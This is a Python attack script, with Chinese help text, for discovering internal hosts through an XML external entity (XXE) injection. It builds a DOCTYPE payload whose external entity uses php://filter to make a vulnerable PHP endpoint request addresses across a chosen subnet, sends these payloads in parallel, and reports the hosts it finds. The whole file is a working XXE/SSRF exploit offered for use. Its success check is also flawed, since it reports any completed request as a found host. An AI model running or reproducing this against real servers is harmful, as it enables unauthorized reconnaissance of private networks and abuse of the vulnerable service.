import requests
import sys
import getopt
from multiprocessing import Pool
from functools import partial, total_ordering


def usage():
    print('-h:  帮助;')
    print('-c:  指定c段')
    print('-u:  指定URL')
    print('-t:  指定线程,未指定的话默认线程为4,如果想要扫描速度快最好指定线程数多一点')
    print('eg:  xxe.py -c 192.168.11 -u "http://192.168.11.128/xxe_test.php"')
    sys.exit()

def banner():
    print('\033[1;34m###################################################################################\033[0m\n')
    print('\033[1;34m#################################HTTP内网主机探测##################################\033[0m\n')
    print('\033[1;34m###################################################################################\033[0m\n')

def send_xml(ip,xml,url):
    headers={
        'Content-Type':'application/xml'
    }
    try:
        res=requests.post(url,data=xml,headers=headers,timeout=5).text
        print('\033[0;32;40m[+]',ip,'Successfully Found !!!\033[0m')
    except:
        pass


def build_xml(ip,url):
    string="php://filter/convert.base64-encode/resource=http://"+ip+'/'
    xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
    xml=xml+"\r\n"+"""<!DOCTYPE foo [<!ELEMENT foo ANY>"""
    xml=xml+"\r\n"+"""<!ENTITY xxe SYSTEM """+'"'+string+'"'+""">]>"""
    xml=xml+"\r\n"+"""<xml>"""
    xml=xml+"\r\n"+"""  <stuff>&xxe;</stuff>"""
    xml=xml+"\r\n"+"""</xml>""" 
    send_xml(ip,xml,url)

def start(argv):
    banner()
    ips=""
    url=""
    thread=4
    ipss=[]
    try:
        opts,args=getopt.getopt(argv,'c:u:ht:')
    except getopt.GetoptError:
        print('error an argument')
        sys.exit()
    for opt,arg in opts:
        if(opt=='-c'):
            ips=arg
        elif(opt=='-u'):
            url=arg
        elif(opt=='-h'):
            usage()
        elif(opt=='-t'):
            thread=int(arg)
    if len(sys.argv)<2:
        print('-h 帮助信息')
        sys.exit()
    for i in range(125,135):
        ip=ips+'.'+str(i)
        ipss.append(ip)
    pool=Pool(processes=thread)
    pool.map(partial(build_xml,url=url),ipss)
      

if __name__=='__main__':
    try:
        start(sys.argv[1:])
        print('扫描结束')
    except KeyboardInterrupt:
        print('interrupted by user,killing all threads...')
